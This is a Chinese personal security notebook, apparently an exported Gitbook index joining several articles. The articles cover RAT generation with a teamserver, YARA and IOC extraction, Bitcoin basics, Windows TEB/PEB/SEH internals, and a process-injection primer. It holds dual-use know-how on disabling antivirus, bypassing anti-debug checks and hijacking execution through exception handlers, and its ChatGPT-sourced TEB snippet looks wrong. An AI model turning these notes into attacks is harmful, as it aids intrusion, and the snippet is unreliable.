一个压缩包包含了服务端和客户端 在服务端用sudo运行./teamserver 服务器ip 密码，vps注意提前打开端口 客户端运行start.bat，直接按照刚才的方式连接就行。用户名随意 到这里就可以用了。 打开attack 这里可以生成一个很简单的malware 然后在指定目录生成一个rat。注意关闭杀毒软件，不然直接杀 提取特征工具 010editor：查看文件类型、文件对比、HEX查看 调试器：查找特征值 CFF、PEstudio等pe工具分析PE文件 一些文件格式的总结 运用 自动化工具 yargen：是一个自动化提取yara规则的工具，可以提取strings和opcodes特征，其原理是先解析出样本集中的共同的字符串，然后经过白名单库的过滤，最后通过启发式、机器学习等方式筛选出最优的yara规则。访问地址 更加高效 避免创建常见的导入导出表的规则，因为相同编译器的结果基本一样 通过文件头之类的文件特征进行初筛 设定大小，防止耗尽资源本机蓝屏 匹配互斥体、注册表值、PDB路径、硬编码的密钥或者密文、C2地址 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 15:47:10 "},"MyArticles/CyberSec/关于bitcoin.html":{"url":"MyArticles/CyberSec/关于bitcoin.html","title":"啥是Bitcoin","keywords":"","body":"作为一个能直接影响密码学、硬件价格、驱动开发、黑客攻击、经济市场的货币，bitcoin确实是22年之前最火的一种虚拟货币。 简介 1、bitcoin一般用来形容比特币本身，当出现Bitcoin的时候，大概率是在谈论比特币的技术形式。 最小的bit币单位是0.00000001。 2、比特币本身作为一种去中心化的货币，不存在类似中央银行一样的中心节点，所以银行卡丢失可以补办，但是比特币密钥丢失那就寄了。 3、比特币的去中心化技术依托于P2P网络，这是一种端到端的网络模式，《图解密码技术》将其归结为“基于p2p网络的支付结算系统”，比特币用户通过使用这一结算系统实现了价值转移。 4、比特币交易是在比特币地址之间完成的，而且每一次成交的地址一般不同，但是捐赠场景会使用同一个地址。 地址生成 讲DSA的公钥输入SHA-256和RIPEDM-160这俩单项散列算法生成散列值，附加一些必要信息，通过base58check进行编码成字符串（不使用0O，Il）。 生成的地址一般是以“1”开头的base编码字符串。 钱包：比特币用户使用的客户端 区块链 保存比特币全部交易的公共账本，讲交易以区块为单位进行的存储 作用：记录所有地址的所有交易（A地址-1，B地址+1这种形式），可以在任意一个地址计算出当前所拥有的比特币数量。 添加区块 比特币以“交易”为单位进行，若干条交易会组成一个区块，当P2P网络确认区块的添加之后，相应的交易就成立了。 其中头部组成为： 上一个区块区块头的hash（H2） 本区块所有交易的hash值（T2） nonce：一个任意数值 一个时间戳 如果一个节点的任意一个数据发生变化，该节点之后的所有数据都需要随之变化。 交易 从一个地址向另一个地址支付比特币的行为。 s:商店；c:顾客 s和c先通过社交或者其他手段确定身份 ---> 商店s创建 公钥B-密钥b对 并利用B生成地址B·，发给顾客c。 顾客c创建 公钥A-密钥a对 并利用A生成地址A· ---> 顾客c创建交易过程 “A·向B·支付1bitcoin” 并利用a对交易进行签名（DSA算法） ---> 顾客c将交易发布到P2P网络（向所有的比特币用户广播消息，这需要一定的手续费）。 这条交易信息和其他的信息合并到一个区块中，区块添加到区块链中。 P2P网络确认了区块，这时交易成立。 挖矿 挖矿的由来： 1、将新的区块添加到区块链 --相当于--> 创造新的比特币余额 --相当于--> 从bit矿中挖出bitcoin 2、最初，比特币协议规定每个区块奖励为50个比特币，但在减半周期结束后，这个奖励会减半为25个比特币。到2020年，这个奖励已经减半到6.25个比特币。当所有的比特币都被挖出来后，就不再产生新的比特币了。 3、矿工还可以从交易费中获得收入。每当一个比特币交易被广播到网络中时，交易发起人需要支付一定的交易费，这些费用将被添加到区块中，并成为矿工的收入之一。因此，即使区块奖励减少到零，矿工仍然可以通过收取交易费来获得收入。 奖励 因为比特币区块链称为单链，所以同一时间只能由一人进行添加，成功添加的人会获得奖励和该区块进行交易的手续费 PoW 工作量证明（Proof of Work），矿工必须证明自己的工作量以此证明区块不是被伪造的，通过散列值来证明。 添加新的区块首先需要一个合法的区块头，区块头中的“前一个区块的散列值”拥有特定格式，他的前面的若干位必须为0 为了达到这个目的就需要上面提到的那个随机数，矿工需要不断的尝试这个随机数以此达到产生合法散列值的要求。 这就可以用来证明矿工的工作量，计算的难度是由前面0的个数进行控制的。 P2P的确认 有可能同一时间多个节点计算出了正确的区块，因为p2p网络的局限性，无法得知哪一个区块先到达节点（a区块先到了张三的节点，但是b区块先到达了Mike先生的节点），具体将哪一个添加到区块链中需要p2p网络的确定。 最终选择的是计算量大的分析（假设是正义的矿工的资源大于邪恶矿工的资源） 匿名性 这里的匿名并非是绝对匿名，虽然不用每一笔交易都带上自己的电话身份证户口本，但是基于网络的交易会暴露你的ip，同时会暴露本次交易的地址（因为你向公众进行了广播），同时交易信息也是摆在明面上的。 安全性（信任） 交易安全 你给对面钱了之后，对面跑路了，没辙，因为没有中心无法追责 虽然没有中心，但是为了减少时间差和方便流通，依旧存在各种交易所，交易所卷钱跑路 --》没辙 系统安全 你的钱包被盗了，或者安装了木马性质的软件导致密钥丢失，活该没辙 参考 《图解密码技术》 chatgpt https://www.8btc.com/books/834/masterbitcoin2cn/_book/ch10.html https://www.blockchain.com/ 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-21 23:34:25 "},"MyArticles/CyberSec/IOC-痛苦金字塔.html":{"url":"MyArticles/CyberSec/IOC-痛苦金字塔.html","title":"从痛苦金字塔学习分析报告","keywords":"","body":" 痛苦金字塔简单，主要是学习如何学习一篇一次攻击的分析报告。利用一个中长篇的分析报告来学习 Bvp47-美国NSA方程式组织的顶级后门 从报告中各取所需 报告分析 1、分类 首先根据目录和简介对报告进行按照内容进行分类。 分类之后根据所分的类进行归纳总结。 事件层面 统述了事情发展的开始-中间-结束。主要的目标是这个事件 谁是攻击者 为什么攻击（目标、目的） 是如何发现并归因的（可能不公开） 结合到痛苦金字塔，这些内容是基于IOC信息上抽象总结出来的，在金字塔顶。 因为水平较高，所以在报告中并不是总能看见他，碰运气。 技术层面 主要针对的是事件中的主要样本，相当于ctf里的wp 样本是什么 样本用什么技术实现了什么目的 样本技术中有没有新颖的地方 2、威胁情报 以 前所未见的后门 为例； 读完之后需要构建大体的流程图或者框架图。 上述流程过于概况，一般的攻击流程基本大差不差，根据内容继续精进细节 威胁情报应该具备这样的特质：具体且独特 3、情报处理 从报告中将ioc提取出来，方便聚类分析，需要注意两个问题 是否有效（易变？个性化？） 能否提取（太抽象） 样本hash 每个hash对应一个样本，可信度很高，放心提取。 私钥 一般各个程序中的私钥不会相同，因为私钥的位数太多，如果私钥一样考虑是否为恶意模仿或者同组织或者下属机构……。可以提取，置信度高，不会轻易变化。 标识码 可能某些特殊的样本会存在标识码，可以提取当作ioc，但是因为少见和格式多样，不会一起列出 IP、Domain 这个时效性特别强，需要进行研判。作为一个重要的标志，准确性并不是特别高，尤其是上古样本 文件列表 如果非常特殊且具有明显特色，可以作为特征，但是如果%temp%之类的常见目录就直接忽略即可 函数处理技巧 有效。包括样本流程、整个文件结构、样本处理手法等等。虽然他们非常抽象，但很多信息都可以从这些抽象的内容中获取。像字段结构、环境校验方法等。可以对照着报告和样本来研判一下。 4、对应到金字塔 当填充完金字塔之后，就算是情报完整了。 5、注意的是 不是所有的情报都是有效的情报， 不是所有有效情报都可以被格式化提取的。 可以被批量提取的IOC们都会有一些特征，更方便于情报分析人员进行大批量、格式化的处理。 常见的IOC类型包括：IP、域名、哈希 等。 6、工程化流程 提取ioc工具 ioc_parser：Github 的开源项目，通过正则将常见的IOC类型从报告中提取出来。 yeti：开源的威胁情报平台，内部集成了一个非常友好的报告解析系统，但平台代码本身依然存在一些小小的问题，使用时候的流畅性无法保证。 ioc来源 [Alien Vault][https://otx.alienvault.com/] 开放的威胁情报社区，有很多人将不同的国家不同地区的报告整理成一个个 pulse。可以根据报告搜索，也可以根据IOC进行搜索。 [Covert.io][http://www.covert.io/threat-intelligence/] 很多安全厂商会在发布自己报告的同时发布一份IOC列表，或者由他人二次加工后形成一个IOC库，我们通常将这种定期维护的IOC库称为Feed。有人会将各种Feed地址整理，做数据的二次集成，比方说下面的链接。 twitter：这个也是很常用的一个情报来源，可以获得分享的情报，还有其他有意思的东西。 参考 https://0x666.club/pyramidofpain2/ https://0x666.club/pyramidofpain1/ https://www.pangulab.cn/post/the_bvp47_a_top-tier_backdoor_of_us_nsa_equation_group/ 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 17:30:25 "},"MyArticles/CyberSec/PEB和TEB.html":{"url":"MyArticles/CyberSec/PEB和TEB.html","title":"TEB & PEB","keywords":"","body":"参考：《逆向工程核心原理》；chatgpt（一般都是胡扯的内容）,用gcc编译的程序怎么在Windows上安装gcc呢 直接安装https://github.com/Embarcadero/Dev-Cpp/releases/tag/v6.3 DEV-c++，然后在安装目录中就可以找到gcc的编译程序啦 TEB typedef struct _TEB { BYTE Reserved1[1952]; PVOID Reserved2[412]; PVOID TlsSlots[64]; BYTE Reserved3[8]; PVOID Reserved4[26]; PVOID ReservedForOle; PVOID Reserved5[4]; PVOID TlsExpansionSlots; } TEB; thread Environment Block 线程环境块，这是一个结构体，包含了进程运行线程的各种信息，一个进程中的每一个线程都包括一个TEB结构体，在winternl.h中可以找到结构体的描述。给出的TEB的定义相当的简单啊，要是真这么简单就行了，通过windbg查看结构体的组成成员 windbg查看 用计算器的进程来查看，首先attach上calc进程，然后输入!teb查看teb结构体的地址，然后定位到TEB，查看到详细信息 0:033> dt 0x0000007e7c4ea000 ntdll!_TEB +0x000 NtTib : _NT_TIB +0x038 EnvironmentPointer : (null) +0x040 ClientId : _CLIENT_ID +0x050 ActiveRpcHandle : (null) +0x058 ThreadLocalStoragePointer : (null) +0x060 ProcessEnvironmentBlock : 0x0000007e`7c493000 _PEB +0x068 LastErrorValue : 0 +0x06c CountOfOwnedCriticalSections : 0 +0x070 CsrClientThread : (null) +0x078 Win32ThreadInfo : (null) +0x080 User32Reserved : [26] 0 +0x0e8 UserReserved : [5] 0 +0x100 WOW32Reserved : (null) +0x108 CurrentLocale : 0x804 +0x10c FpSoftwareStatusRegister : 0 +0x110 ReservedForDebuggerInstrumentation : [16] (null) +0x190 SystemReserved1 : [30] (null) +0x280 PlaceholderCompatibilityMode : 0 '' +0x281 PlaceholderHydrationAlwaysExplicit : 0 '' +0x282 PlaceholderReserved : [10] \"\" +0x28c ProxiedProcessId : 0 +0x290 _ActivationStack : _ACTIVATION_CONTEXT_STACK +0x2b8 WorkingOnBehalfTicket : [8] \"\" +0x2c0 ExceptionCode : 0n0 +0x2c4 Padding0 : [4] \"\" +0x2c8 ActivationContextStackPointer : 0x0000007e`7c4ea290 _ACTIVATION_CONTEXT_STACK +0x2d0 InstrumentationCallbackSp : 0 +0x2d8 InstrumentationCallbackPreviousPc : 0 +0x2e0 InstrumentationCallbackPreviousSp : 0 +0x2e8 TxFsContext : 0xfffe +0x2ec InstrumentationCallbackDisabled : 0 '' +0x2ed UnalignedLoadStoreExceptions : 0 '' +0x2ee Padding1 : [2] \"\" +0x2f0 GdiTebBatch : _GDI_TEB_BATCH +0x7d8 RealClientId : _CLIENT_ID +0x7e8 GdiCachedProcessHandle : (null) +0x7f0 GdiClientPID : 0 +0x7f4 GdiClientTID : 0 +0x7f8 GdiThreadLocalInfo : (null) +0x800 Win32ClientInfo : [62] 0 +0x9f0 glDispatchTable : [233] (null) +0x1138 glReserved1 : [29] 0 +0x1220 glReserved2 : (null) +0x1228 glSectionInfo : (null) +0x1230 glSection : (null) +0x1238 glTable : (null) +0x1240 glCurrentRC : (null) +0x1248 glContext : (null) +0x1250 LastStatusValue : 0 +0x1254 Padding2 : [4] \"\" +0x1258 StaticUnicodeString : _UNICODE_STRING \"\" +0x1268 StaticUnicodeBuffer : [261] \"\" +0x1472 Padding3 : [6] \"\" +0x1478 DeallocationStack : 0x0000007e`7d100000 Void +0x1480 TlsSlots : [64] (null) +0x1680 TlsLinks : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ] +0x1690 Vdm : (null) +0x1698 ReservedForNtRpc : (null) +0x16a0 DbgSsReserved : [2] (null) +0x16b0 HardErrorMode : 0 +0x16b4 Padding4 : [4] \"\" +0x16b8 Instrumentation : [11] (null) +0x1710 ActivityId : _GUID {00000000-0000-0000-0000-000000000000} +0x1720 SubProcessTag : (null) +0x1728 PerflibData : (null) +0x1730 EtwTraceData : (null) +0x1738 WinSockData : (null) +0x1740 GdiBatchCount : 0 +0x1744 CurrentIdealProcessor : _PROCESSOR_NUMBER +0x1744 IdealProcessorValue : 0x1010000 +0x1744 ReservedPad0 : 0 '' +0x1745 ReservedPad1 : 0 '' +0x1746 ReservedPad2 : 0x1 '' +0x1747 IdealProcessor : 0x1 '' +0x1748 GuaranteedStackBytes : 0 +0x174c Padding5 : [4] \"\" +0x1750 ReservedForPerf : (null) +0x1758 ReservedForOle : (null) +0x1760 WaitingOnLoaderLock : 0 +0x1764 Padding6 : [4] \"\" +0x1768 SavedPriorityState : (null) +0x1770 ReservedForCodeCoverage : 0 +0x1778 ThreadPoolData : (null) +0x1780 TlsExpansionSlots : (null) +0x1788 DeallocationBStore : (null) +0x1790 BStoreLimit : (null) +0x1798 MuiGeneration : 0 +0x179c IsImpersonating : 0 +0x17a0 NlsCache : (null) +0x17a8 pShimData : (null) +0x17b0 HeapData : 0 +0x17b4 Padding7 : [4] \"\" +0x17b8 CurrentTransactionHandle : (null) +0x17c0 ActiveFrame : (null) +0x17c8 FlsData : (null) +0x17d0 PreferredLanguages : (null) +0x17d8 UserPrefLanguages : (null) +0x17e0 MergedPrefLanguages : (null) +0x17e8 MuiImpersonation : 0 +0x17ec CrossTebFlags : 0 +0x17ec SpareCrossTebBits : 0y0000000000000000 (0) +0x17ee SameTebFlags : 8 +0x17ee SafeThunkCall : 0y0 +0x17ee InDebugPrint : 0y0 +0x17ee HasFiberData : 0y0 +0x17ee SkipThreadAttach : 0y1 +0x17ee WerInShipAssertCode : 0y0 +0x17ee RanProcessInit : 0y0 +0x17ee ClonedThread : 0y0 +0x17ee SuppressDebugMsg : 0y0 +0x17ee DisableUserStackWalk : 0y0 +0x17ee RtlExceptionAttached : 0y0 +0x17ee InitialThread : 0y0 +0x17ee SessionAware : 0y0 +0x17ee LoadOwner : 0y0 +0x17ee LoaderWorker : 0y0 +0x17ee SkipLoaderInit : 0y0 +0x17ee SpareSameTebBits : 0y0 +0x17f0 TxnScopeEnterCallback : (null) +0x17f8 TxnScopeExitCallback : (null) +0x1800 TxnScopeContext : (null) +0x1808 LockCount : 0 +0x180c WowTebOffset : 0n0 +0x1810 ResourceRetValue : (null) +0x1818 ReservedForWdf : (null) +0x1820 ReservedForCrt : 0 +0x1828 EffectiveContainerId : _GUID {00000000-0000-0000-0000-000000000000} 用户模式 在用户模式调试中，两个成员起到重要作用 NT_TIB TEB结构体的第一个成员，Thread Infomation Block，线程信息块 typedef struct _NT_TIB { struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; PVOID StackBase; // 线程堆栈顶 PVOID StackLimit; // 线程堆栈底 PVOID SubSystemTib; union { PVOID FiberData; DWORD Version; }; PVOID ArbitraryUserPointer; struct _NT_TIB *Self; // _NT_TIB结构体的自引用指针 } NT_TIB; ExceptionList 指向一个链表，由_EXCEPTION_REGISTRATION_RECORD结构体组成的链表。这个链表用于Windows的SEH ProcessEnvironmentBlock 指向PEB结构体 TEB的访问 在用户模式通过特定的API进行访问 Ntdll.NtCurrentTeb 返回当前线程的TEB结构体的地址，但是我在win10中的calc进程中没有找到这个函数，在win7也没有找到这个函数，用的是x64dbg。 但是通过ollydbg就可以找到这个函数，这是为什么呢？ 我懂了，只有32位的程序才会用到这个函数，64位的程序不会，这是为什么呢？ chatgpt说64位的程序使用__readgsqword函数 #include void *GetCurrentTeb() { void *teb; __readgsqword((unsigned long long*)&teb); return teb; } 这个函数的作用就是访问并返回FS寄存器的0x18的位置。 这个地址存放的内容是当前线程TEB的地址，而且等于FS段寄存器所指的段内存的基址 FS寄存器 FS寄存器用来借助SDT索引指示当前线程的TEB结构体（32位操作系统4G虚拟内存，但是这个寄存器只有16位，所以要借助SDT索引） SDT：位于内核内存区域，其地址存储在寄存器GDTR寄存器中，这个区域有实际的TEB地址。 这是x64dbg给的解释，但是不知道怎么查看FS寄存器😅。 用命令disasm fs:[0]命令来查看FS寄存器，也可以用带的计算器查看 根据《逆向工程核心原理》给出的流程图 段选择符：因为FS寄存器中实际存储的是SDT的索引，所以称为段选择符（Segment Selector） FS:[18] = TEB的起始地址，还是计算器好用 FS:[30] = PEB的起始地址 借用《逆向工程核心原理》的等式 FS:[18] = TEB.NtTib.Self = TIB的地址 = TEB的地址 FS:[0] = TEB.NtTib.ExceptionList = SEH的地址 SEH是Windows的结构化异常处理机制 PEB typedef struct _PEB { BYTE Reserved1[2]; BYTE BeingDebugged; BYTE Reserved2[1]; PVOID Reserved3[2]; PPEB_LDR_DATA Ldr; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; BYTE Reserved4[104]; PVOID Reserved5[52]; PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine; BYTE Reserved6[128]; PVOID Reserved7[1]; ULONG SessionId; } PEB,*PPEB; 进程环境块（process environment block），每个进程都对应一个PEB PEB内容很多，这里就记录几个书上写的吧。 PEB.BeingDebugger 函数原型： BOOL IsDebuggerPresent(); 这个 api函数在kernel32.dll中，用于判断当前进程是否处于调试状态，通过检测PEB.BeingDebugger成员来检测是否在调试进程，是返回1。 原理 通过调试这个函数，发现他的定义在kernelbase.dll中，这是因为Windows的版本问题 下图是64位的程序： 这是32位的程序 PEB.ImageBaseAddress 表示进程的ImageBase，一般用GetModuleHandle()函数来获取imagebase，返回值就是加载的基址。其实就是把PEB.BeingDebugger的内容放在eax寄存器中 PEB.Ldr 通过该成员可以直接获得该模块加载的基地址，但是我对他不感兴趣，但是他也可以应用于反调试技术。 根据书上说的，在进程被调试的时候，未使用的堆内存中全部填充着0xFEEEFEEE，证明正在被调试 【只在XP系统中有，Vista之后的系统没有这种标志】所以就无所谓了，要绕过就直接把内存都改成null就行了。 而且附加调试的进程不会存在这个情况，反正挺鸡肋的东西 PEB.ProcessHeap 和 NtGlobalFlag 这俩应用于反调试技术 PEB.ProcessHeap 指向HEAP结构体的指针 API查看 通过GetProcessHeap()这个api查看，这个api实现的思路和IsDebuggerPresent差不多 也是通过FS寄存器去定位。在正常职系那个的时候，Heap.Flags的值是2，Heap.ForceFlags的值是0。 反正patch的时候直接改回来就行。【这个东西仅限于winXP，win7就已经没了，而且附加的调试进程也不会】 NtGlobalFlag 这玩意意义也不大了，现在都win10，win11了 Windows系统异常 Structured Exception Handling：结构化 异常 处理机制；总是应用于基本的异常处理和反调试，反正学PEB和TEB，一起记录一下， 在C/C++的程序中，通过使用_try、\\_except和__finally关键字来实现 #include #include int main() { __try { // 代码块，可能会抛出异常 } __except(EXCEPTION_EXECUTE_HANDLER) { // 处理异常的代码 } return 0; } 注意 和c/c++中的try， catch异常处理是不同的，trycatch这个是C++语言的标准机制。SEH是Windows的机制 SEH仅在Windows平台上可用，而try catch可在多种平台上使用。 异常 但是我没有找到这个winnt.h这个文件中没有这些内容啊好奇怪啊，找到了，就是定义不同罢了 #define STATUS_WAIT_0 ((DWORD )0x00000000L) #define STATUS_ABANDONED_WAIT_0 ((DWORD )0x00000080L) #define STATUS_USER_APC ((DWORD )0x000000C0L) #define STATUS_TIMEOUT ((DWORD )0x00000102L) #define STATUS_PENDING ((DWORD )0x00000103L) #define DBG_EXCEPTION_HANDLED ((DWORD )0x00010001L) #define DBG_CONTINUE ((DWORD )0x00010002L) #define STATUS_SEGMENT_NOTIFICATION ((DWORD )0x40000005L) #define STATUS_FATAL_APP_EXIT ((DWORD )0x40000015L) #define DBG_REPLY_LATER ((DWORD )0x40010001L) #define DBG_TERMINATE_THREAD ((DWORD )0x40010003L) #define DBG_TERMINATE_PROCESS ((DWORD )0x40010004L) #define DBG_CONTROL_C ((DWORD )0x40010005L) #define DBG_PRINTEXCEPTION_C ((DWORD )0x40010006L) #define DBG_RIPEXCEPTION ((DWORD )0x40010007L) #define DBG_CONTROL_BREAK ((DWORD )0x40010008L) #define DBG_COMMAND_EXCEPTION ((DWORD )0x40010009L) #define DBG_PRINTEXCEPTION_WIDE_C ((DWORD )0x4001000AL) #define STATUS_GUARD_PAGE_VIOLATION ((DWORD )0x80000001L) #define STATUS_DATATYPE_MISALIGNMENT ((DWORD )0x80000002L) #define STATUS_BREAKPOINT ((DWORD )0x80000003L) #define STATUS_SINGLE_STEP ((DWORD )0x80000004L) #define STATUS_LONGJUMP ((DWORD )0x80000026L) #define STATUS_UNWIND_CONSOLIDATE ((DWORD )0x80000029L) #define DBG_EXCEPTION_NOT_HANDLED ((DWORD )0x80010001L) #define STATUS_ACCESS_VIOLATION ((DWORD )0xC0000005L) #define STATUS_IN_PAGE_ERROR ((DWORD )0xC0000006L) #define STATUS_INVALID_HANDLE ((DWORD )0xC0000008L) #define STATUS_INVALID_PARAMETER ((DWORD )0xC000000DL) #define STATUS_NO_MEMORY ((DWORD )0xC0000017L) #define STATUS_ILLEGAL_INSTRUCTION ((DWORD )0xC000001DL) #define STATUS_NONCONTINUABLE_EXCEPTION ((DWORD )0xC0000025L) #define STATUS_INVALID_DISPOSITION ((DWORD )0xC0000026L) #define STATUS_ARRAY_BOUNDS_EXCEEDED ((DWORD )0xC000008CL) #define STATUS_FLOAT_DENORMAL_OPERAND ((DWORD )0xC000008DL) #define STATUS_FLOAT_DIVIDE_BY_ZERO ((DWORD )0xC000008EL) #define STATUS_FLOAT_INEXACT_RESULT ((DWORD )0xC000008FL) #define STATUS_FLOAT_INVALID_OPERATION ((DWORD )0xC0000090L) #define STATUS_FLOAT_OVERFLOW ((DWORD )0xC0000091L) #define STATUS_FLOAT_STACK_CHECK ((DWORD )0xC0000092L) #define STATUS_FLOAT_UNDERFLOW ((DWORD )0xC0000093L) #define STATUS_INTEGER_DIVIDE_BY_ZERO ((DWORD )0xC0000094L) #define STATUS_INTEGER_OVERFLOW ((DWORD )0xC0000095L) #define STATUS_PRIVILEGED_INSTRUCTION ((DWORD )0xC0000096L) #define STATUS_STACK_OVERFLOW ((DWORD )0xC00000FDL) #define STATUS_DLL_NOT_FOUND ((DWORD )0xC0000135L) #define STATUS_ORDINAL_NOT_FOUND ((DWORD )0xC0000138L) #define STATUS_ENTRYPOINT_NOT_FOUND ((DWORD )0xC0000139L) #define STATUS_CONTROL_C_EXIT ((DWORD )0xC000013AL) #define STATUS_DLL_INIT_FAILED ((DWORD )0xC0000142L) #define STATUS_CONTROL_STACK_VIOLATION ((DWORD )0xC00001B2L) #define STATUS_FLOAT_MULTIPLE_FAULTS ((DWORD )0xC00002B4L) #define STATUS_FLOAT_MULTIPLE_TRAPS ((DWORD )0xC00002B5L) #define STATUS_REG_NAT_CONSUMPTION ((DWORD )0xC00002C9L) #define STATUS_HEAP_CORRUPTION ((DWORD )0xC0000374L) #define STATUS_STACK_BUFFER_OVERRUN ((DWORD )0xC0000409L) #define STATUS_INVALID_CRUNTIME_PARAMETER ((DWORD )0xC0000417L) #define STATUS_ASSERTION_FAILURE ((DWORD )0xC0000420L) #define STATUS_ENCLAVE_VIOLATION ((DWORD )0xC00004A2L) #define STATUS_INTERRUPTED ((DWORD )0xC0000515L) #define STATUS_THREAD_NOT_RUNNING ((DWORD )0xC0000516L) #define STATUS_ALREADY_REGISTERED ((DWORD )0xC0000718L) 这里书上就写了5个常见的异常，我也就学5个吧。 EXCEPTION__ACCESS_VIOLATION 0xC0000005L 这个异常，确实最常见，当时就是在执行汇编指令mov eax, dword ptr fs:[30]的时候，或者是upx脱壳之后的问题。 在上述文件中记录的是这个错误：STATUS_ACCESS_VIOLATION 就是试图访问没有权限的内存，或者是不存在的内存，非法的内存访问 EXCEPTION_BREAKPOINT 0x80000003L 记录的是这个STATUS_BREAKPOINT，这个非常常见，CPU执行到设置断点的位置的时候，就会发生这个异常，调试器的下断点的功能就是通过这个异常实现的《逆向工程核心原理》是这么说的啊。 通过下int3的断点（将该内存的指令改成了0xcc，但是调试器为了效率和可读性，并不显示）这里试验一下书上的办法 测试 一个exe文件 我现在把他dump出来，没有啥工具，直接用任务管理器把他dump出来 看到对应的地址，内存中的数值已经发生了改变，测试成功。 成功个p，这压根就不是那个内存，通过排查发现，并没有找到目标代码。确实找不到。 STATUS_ILLEGAL_INSTRUCTION 0xC000001D 遇到非法指令就会触发这个异常，比如执行到cpu不认识的指令 STATUS_INTEGER_DIVIDE_BY_ZERO 0xC0000094 分母为零就会触发这个异常，这个我觉得有意思可以实验一下 三行小代码，尝试一下触发异常 成功触发异常啊，调试器已经卡死了，这个地方就可以作为一个shellcode的触发点，这个视频里也讲过https://www.bilibili.com/video/BV1uY4y1q76L/?spm_id_from=333.880.my_history.page.click STATUS_SINGLE_STEP 0x80000004L 单步：SINGLE_STEP。执行一条指令然后暂停，cpu进入单步模式，每执行一条指令就触发这个异常，暂停运行。 将TF寄存器设置成1可以做到。 SEH链 SEH(Structured Exception Handling)以链的形式存在【由_EXCEPTION_REGISTRATION_RECORD结构体组成的链表】。第一个异常处理器中如果没有处理响应的异常，就按次序传递给下一个异常处理器，一个一个往下走，直到得到处理。 给出的定义是 typedef struct _EXCEPTION_REGISTRATION_RECORD { struct _EXCEPTION_REGISTRATION_RECORD *Next; //指向下一个结构的指针 PEXCEPTION_ROUTINE Handler; //当前异常处理函数的地址 }EXCEPTION_REGISTRATION_RECORD; 如果Next的值是一串f，那就是到头了。根据《逆向工程核心原理》给出的图，我看还是通用的。 异常触发的时候，异常会按照 ABC的顺序传递，直到被解决 Handler 异常处理函数（异常处理器）的定义，《逆向工程核心原理》给出了描述 接收四个参数（保存着异常的相关信息），然后返回一个枚举类型，这是由系统调用的，属于是回调函数。 参数1： 指向EXCEPTION_RECORD结构体的指针， typedef struct _EXCEPTION_RECORD { DWORD ExceptionCode; // 异常代码 DWORD ExceptionFlags; struct _EXCEPTION_RECORD *ExceptionRecord; PVOID ExceptionAddress; // 异常发生的地址 DWORD NumberParameters; ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS]; } EXCEPTION_RECORD; 参数3： 指向CONTEXT结构体的指针，这个结构体用来在多线程情况下备份CPU结构体的值。 typedef struct _CONTEXT { DWORD64 P1Home; DWORD64 P2Home; DWORD64 P3Home; DWORD64 P4Home; DWORD64 P5Home; DWORD64 P6Home; DWORD ContextFlags; DWORD MxCsr; WORD SegCs; WORD SegDs; WORD SegEs; WORD SegFs; WORD SegGs; WORD SegSs; DWORD EFlags; DWORD64 Dr0; DWORD64 Dr1; DWORD64 Dr2; DWORD64 Dr3; DWORD64 Dr6; DWORD64 Dr7; DWORD64 Rax; DWORD64 Rcx; DWORD64 Rdx; DWORD64 Rbx; DWORD64 Rsp; DWORD64 Rbp; DWORD64 Rsi; DWORD64 Rdi; DWORD64 R8; DWORD64 R9; DWORD64 R10; DWORD64 R11; DWORD64 R12; DWORD64 R13; DWORD64 R14; DWORD64 R15; DWORD64 Rip; union { XMM_SAVE_AREA32 FltSave; NEON128 Q[16]; ULONGLONG D[32]; struct { M128A Header[2]; M128A Legacy[8]; M128A Xmm0; M128A Xmm1; M128A Xmm2; M128A Xmm3; M128A Xmm4; M128A Xmm5; M128A Xmm6; M128A Xmm7; M128A Xmm8; M128A Xmm9; M128A Xmm10; M128A Xmm11; M128A Xmm12; M128A Xmm13; M128A Xmm14; M128A Xmm15; } DUMMYSTRUCTNAME; DWORD S[32]; } DUMMYUNIONNAME; M128A VectorRegister[26]; DWORD64 VectorControl; DWORD64 DebugControl; DWORD64 LastBranchToRip; DWORD64 LastBranchFromRip; DWORD64 LastExceptionToRip; DWORD64 LastExceptionFromRip; } CONTEXT, *PCONTEXT; 每一个线程内部都独立拥有这样一个结构体，当CPU取执行其他线程的时候，当前的值就会存储在这个结构体中，当cpu再回来运行的时候 ，这个结构体就将cpu重新赋值，这里也是线程劫持注入法的一个基本原理。 当异常发生时，此时的系统会把context结构体转交给异常处理函数的对应的参数。在异常处理函数中，将参数传来的context.eip（rip）的值设置为其他地址，然后返回异常处理函数，这样程序流就被劫持到了新的程序 返回值： 出处：https://www.nirsoft.net/kernel_struct/vista/EXCEPTION_DISPOSITION.html typedef enum _EXCEPTION_DISPOSITION { ExceptionContinueExecution = 0, // 继续执行异常代码 ExceptionContinueSearch = 1, // 运行下一个异常处理器 ExceptionNestedException = 2, ExceptionCollidedUnwind = 3 } EXCEPTION_DISPOSITION; 访问SEH 通过TEB结构体的NtTib成员进行访问。 windbg： > dt _teb > dt _NT_TIB 安装SEH C语言中使用__try, __except, __finally关键字可以直接添加seh，或者直接在汇编中添加。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-25 16:35:07 "},"MyArticles/CyberSec/进程注入-基础.html":{"url":"MyArticles/CyberSec/进程注入-基础.html","title":"进程注入-前置","keywords":"","body":"进程注入 在进程内存空间中执行任意代码的技术方法。通过一定方法将dll，shellcode等代码数据写入其他进程执行。这里为几个具有实战意义的注入手法。 原理 大致步骤 确定目标进程（新创建的或者打开已有进程）。 向目标进程中写入数据。 令被写入进程执行我们写入的代码数据。 相关api调用 可以注入的东西包括：一个节区，一进程，一段代码（shellcode，PE文件）或者一个dll文件。 利用Sysmon 介绍 微软中文文档：https://learn.microsoft.com/zh-cn/sysinternals/downloads/sysmon sysmon：系统监视器 (Sysmon) 是一种 Windows 系统服务和设备驱动程序，一旦安装在系统上，在系统重新启动后仍保持驻留状态，以监视系统活动并将系统活动记录到 Windows 事件日志。 它提供有关进程创建、网络连接和文件创建时间更改的详细信息。 通过收集它使用 Windows 事件收集.aspx) 或 SIEM 